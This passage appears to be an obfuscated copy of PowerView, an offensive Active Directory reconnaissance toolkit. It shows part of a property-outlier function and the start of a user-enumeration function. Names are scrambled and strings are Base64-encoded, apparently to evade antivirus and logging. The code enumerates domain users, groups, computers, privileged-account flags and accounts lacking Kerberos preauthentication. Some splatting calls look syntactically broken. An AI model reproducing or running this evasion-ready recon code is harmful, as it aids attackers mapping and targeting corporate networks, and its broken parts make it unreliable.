        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${__/===\/=\/===\_/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBpAHYAZQBuAG4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGkAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),'sn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${_/====\/=\_____/=} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB5AHMAdABlAG0AZgBsAGEAZwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${______/==\_/=====} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAHAAbwBsAGkAYwB5AGYAbABhAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${/====\/\/\_____/\} = ____/\/\/=\/\/==\/ -Domain $Domain | select -ExpandProperty Forest | select -ExpandProperty Name
            }
            else {
                ${/====\/\/\_____/\} = ____/\/\/=\/\/==\/ -Domain $Domain -Credential $Credential | select -ExpandProperty Forest | select -ExpandProperty Name
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAbgB1AG0AZQByAGEAdABlAGQAIABmAG8AcgBlAHMAdAAgACcAJAB7AC8APQA9AD0APQBcAC8AXAAvAFwAXwBfAF8AXwBfAC8AXAB9ACcAIABmAG8AcgAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwA=')))
        }
        ${___/\_______/==\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/\_______/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if (${/====\/\/\_____/\}) {
            ${___/\_______/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = ${/====\/\/\_____/\}
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUAUAByAG8AcABlAHIAdAB5AFMAZQB0AA==')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHMAcABlAGMAaQBmAGkAZQBkACAALQBSAGUAZgBlAHIAZQBuAGMAZQBQAHIAbwBwAGUAcgB0AHkAUwBlAHQA')))
            ${__/\/=\/=\/==\/\/} = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUATwBiAGoAZQBjAHQA')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAaQBuAGcAIABwAHIAbwBwAGUAcgB0AHkAIABuAGEAbQBlAHMAIABmAHIAbwBtACAALQBSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdAAgAHQAbwAgAHUAcwBlACAAYQBzACAAdABoAGUAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAHMAZQB0AA==')))
            ${__/\/=\/=\/==\/\/} = gm -InputObject $ReferenceObject -MemberType NoteProperty | select -Expand Name
            ${__/\/=\/==\_/==\_} = $ReferenceObject.objectclass | select -Last 1
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEMAYQBsAGMAdQBsAGEAdABlAGQAIABSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdABDAGwAYQBzAHMAIAA6ACAAJAB7AF8AXwAvAFwALwA9AFwALwA9AD0AXABfAC8APQA9AFwAXwB9AA==')))
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHQAaABlACAAZABlAGYAYQB1AGwAdAAgAHIAZQBmAGUAcgBlAG4AYwBlACAAcAByAG8AcABlAHIAdAB5ACAAcwBlAHQAIABmAG8AcgAgAHQAaABlACAAbwBiAGoAZQBjAHQAIABjAGwAYQBzAHMAIAAnACQAQwBsAGEAcwBzAE4AYQBtAGUAJwA=')))
        }
        if (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))) -or (${__/\/=\/==\_/==\_} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))) {
            ${___/====\__/=\__/} = __/\__/\/======\_/ @/=\___/=\__/=\/\/
            if (-not ${__/\/=\/=\/==\/\/}) {
                ${__/\/=\/=\/==\/\/} = ${__/===\/=\/===\_/}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or (${__/\/=\/==\_/==\_} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))) {
            ${___/====\__/=\__/} = ___/\/=========\/\ @/=\___/=\__/=\/\/
            if (-not ${__/\/=\/=\/==\/\/}) {
                ${__/\/=\/=\/==\/\/} = ${_/====\/=\_____/=}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or (${__/\/=\/==\_/==\_} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            ${___/====\__/=\__/} = _/==\/\/\_______/\ @/=\___/=\__/=\/\/
            if (-not ${__/\/=\/=\/==\/\/}) {
                ${__/\/=\/=\/==\/\/} = ${______/==\_/=====}
            }
        }
        else {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEkAbgB2AGEAbABpAGQAIABjAGwAYQBzAHMAOgAgACQAQwBsAGEAcwBzAE4AYQBtAGUA')))
        }
        ForEach ($Object in ${___/====\__/=\__/}) {
            ${/===\___/\_/==\/\} = gm -InputObject $Object -MemberType NoteProperty | select -Expand Name
            ForEach(${_/==\_/=\__/\___/} in ${/===\___/\_/==\/\}) {
                if (${__/\/=\/=\/==\/\/} -NotContains ${_/==\_/=\__/\___/}) {
                    ${__/\/=\/\/\/==\__} = New-Object PSObject
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Object.SamAccountName
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdAB5AA=='))) ${_/==\_/=\__/\___/}
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAGwAdQBlAA=='))) $Object.${_/==\_/=\__/\___/}
                    ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwBwAGUAcgB0AHkATwB1AHQAbABpAGUAcgA='))))
                    ${__/\/=\/\/\/==\__}
                }
            }
        }
    }
}
function __/\__/\/======\_/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [Switch]
        ${_/===\/=\_/\_/\/==},
        [Switch]
        ${_/==\/\_/\/==\_/=\},
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        ${__/\/\/\______/\/=},
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        ${__/\_/\___/=\/=\/=},
        [Switch]
        ${__/==\_/\/===\_/\/},
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        ${__/\/=\____/=\__/=},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${__/==\__/===\/=\/} = [Enum]::GetNames(${/==\_/\/\___/\___})
        ${__/==\__/===\/=\/} = ${__/==\__/===\/=\/} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        _/=\/==\/\_/\__/== -Name UACFilter -ValidateSet ${__/==\__/===\/=\/} -_/=\/\/\_/\/\/\__/ ([array])
    }
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
